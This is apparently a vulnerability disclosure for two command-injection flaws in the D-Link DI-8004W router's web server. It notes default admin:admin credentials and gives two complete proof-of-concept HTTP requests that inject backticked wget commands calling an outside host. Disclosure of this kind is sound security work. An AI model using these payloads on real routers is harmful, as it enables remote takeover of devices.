### D-link DI_8004W rce

Firmware Name: DI_8004W-16.07.26A1.trx

- Model: DI_8004W

-  Version: 16.07.26A1

- Test Environment: Ubuntu 22.04 

- offical website:www.dlink.com

  download link:http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8004W





The DI-8004W is a certified router for internet behavior management.  There are two command execution vulnerability in its jhttpd's msp_info_htm function and upgrade_filter_asp.

affect version:

![image](https://github.com/user-attachments/assets/8288e5da-4021-4bc8-ac01-cd8d42b8c202)




![image](https://github.com/user-attachments/assets/9f0d75fb-1109-4bf3-9ed6-89e8ac40d167)




![image](https://github.com/user-attachments/assets/9fc30bff-b7c0-4af3-9442-fdc1db8efebe)




### exploit 1: function msp_info_htm

After logging in with the default password admin:admin, accessing the msp_info.htm page, and crafting carefully constructed parameters, it is possible to execute commands.

```
GET /msp_info.htm?flag=cmd&cmd=`wget%20http://192.168.0.2:8000/aaa` HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: uid=DEiAsct48; wys_userid=admin,wys_passwd=1D3BB56A0D060C342D7DF9A62D1C746E

Upgrade-Insecure-Requests: 1




```

![image](https://github.com/user-attachments/assets/982f8b00-e411-4090-8fe1-27511d0a909f)












### exploit 2: function upgrade_filter_asp

After logging in with the default password admin:admin, accessing the upgrade_filter.asp page, and crafting carefully constructed parameters, it is possible to execute commands.

poc

```
GET /upgrade_filter.asp?path=http://`wget%20http://192.168.0.2:8000/asdf` HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: uid=DEiAsct48; wys_userid=admin,wys_passwd=1D3BB56A0D060C342D7DF9A62D1C746E

Upgrade-Insecure-Requests: 1


```

![image](https://github.com/user-attachments/assets/092f686d-6854-488d-8f3b-f1d7291c07ce)
